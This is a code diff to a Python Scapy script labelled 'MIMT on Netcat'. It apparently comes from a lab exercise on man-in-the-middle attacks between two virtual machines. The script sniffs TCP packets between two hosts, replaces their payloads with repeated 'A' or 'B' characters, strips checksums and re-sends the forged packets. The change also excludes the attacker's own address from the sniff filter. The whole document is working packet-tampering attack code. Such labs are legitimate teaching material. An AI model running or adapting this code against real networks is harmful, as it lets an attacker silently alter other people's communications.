@@ -9,29 +9,26 @@ print("MIMT on Netcat")
 def spoof_pkt(pkt):
 	if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
 		real = pkt[TCP].payload.load
-		data =  real.replace(b'Manik',b'AAAAA')
-		#payload_after = len(data)
-		#payload_diff = payload_after - payload_before
+		data = ""
+		for i in range(len(real)):
+			data += 'A'
+		#data =  real.replace(b'Manik',b'AAAAA')
 		newpkt = IP(bytes(pkt[IP]))
 		del(newpkt.chksum)
 		del(newpkt[TCP].payload) 
 		del(newpkt[TCP].chksum)
-		#newpkt[IP].len = pkt[IP].len + payload_diff
 		newpkt = newpkt/data
-		newpkt.show()
 		send(newpkt, verbose = False)
-	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
+	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP and pkt[TCP].payload:
 		real = pkt[TCP].payload.load
-		data =  real.replace(b'Sharma',b'BBBBBB')
-		#payload_after = len(data)
-		#payload_diff = payload_after - payload_before
+		data = ""
+		for i in range(len(real)):
+			data += 'B'
 		newpkt = IP(bytes(pkt[IP]))
 		del(newpkt.chksum)
 		del(newpkt[TCP].payload) 
 		del(newpkt[TCP].chksum)
-		#newpkt[IP].len = pkt[IP].len + payload_diff
 		newpkt = newpkt/data
-		newpkt.show()
 		send(newpkt, verbose = False)
 		
-pkt = sniff(filter='tcp',prn=spoof_pkt)
+pkt = sniff(filter='tcp and not src 10.9.0.101',prn=spoof_pkt)
